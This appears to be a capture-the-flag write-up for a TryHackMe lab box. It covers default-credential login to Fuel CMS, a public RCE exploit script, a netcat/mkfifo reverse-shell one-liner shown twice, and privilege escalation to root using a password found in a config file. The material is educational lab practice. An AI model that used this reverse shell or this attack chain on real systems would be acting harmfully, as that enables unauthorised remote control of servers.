---
title: Bounty Hacker
parent: THM Boxes
grand_parent: Pwn Counter
nav_order: 18
---

# Bountry Hacker

<img width="986" height="345" alt="THM-BH_badge" src="https://github.com/user-attachments/assets/00bf0c4b-fbf6-4c10-b495-76ec34dc22fc" />

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Box Description

> A new start-up has a few issues with their web server.

## Recon
As always I start off with ```nmap -sC -sV -vv ip``` on the target box. This scan revealed that the target box has a webserver running on ```port 80```.

Visiting the webpage via Firefox, we are greeted by a Fuel CMS setup page, and at the bottom, we find the information that the default creds are ```admin:admin```; lets try them out.

The default creds worked and now we have access to the admin panel of the CMS.

I played around the settings a bit, but was having trouble with executing my php files, so I pivoted to a different exploit.

Using ```searchsploit fuel cms```, I found a python script exploiting a rce vulnerability on the exact version I was on.

Downloading that script, I executed the script by providing the url and had rce.

Now this wasn't a reverse shell, it would take your command then go back to the working directory you originated at which was kind of annoying.

I set up a listener on another terminal session and executed ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST PORT >/tmp/f``` via the rce exploit python script and got a callback, nice.

<img width="737" height="34" alt="image" src="https://github.com/user-attachments/assets/f7b74285-5771-4bda-93f8-4839f2d697e7" />

Upon getting this reverse shell, I upgraded my shell using python, and began searching for suid binaries to exploit but was unable to find any.

I also tried ```sudo -l``` for any sudo misconfigurations but I needed the password so no luck there.

After being stumped for a bit, I decided to try out ```linpeas.sh``` and see if I could find anything nice.

Searching through the output, I found some interesting pathways, but nothing that would give me root.

Then I noticed that linpeas.sh found a password in a config php file.

<img width="666" height="58" alt="image" src="https://github.com/user-attachments/assets/7d0a7665-fde3-4ff0-ad7d-6ef6337d5b2d" />

<img width="526" height="36" alt="image" src="https://github.com/user-attachments/assets/c9d97455-629e-44e4-a140-32c42a4cdbfa" />

---

## Priv Esc
With this password, I tried to execute ```su```, input the password when prompted, and got root privileges.

<img width="343" height="161" alt="image" src="https://github.com/user-attachments/assets/fb1c3944-4c95-43ee-af11-429a99287078" />

---

## Solution Steps

1. Use Fuel CMS RCE exploit via python script
2. execute ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST PORT >/tmp/f```
3. get password from config php file
4. execute ```su``` with password and get root


## Thoughts
I thought this box was pretty easy, but it was nice seeing a config file based attack path which you dont see often for easy boxes. The only issue I had was executing a reverse shell with the rce script but it just taught me that the ```nc mkfifo``` reverse shell command is the most reliable.

--

Thank you for reading!

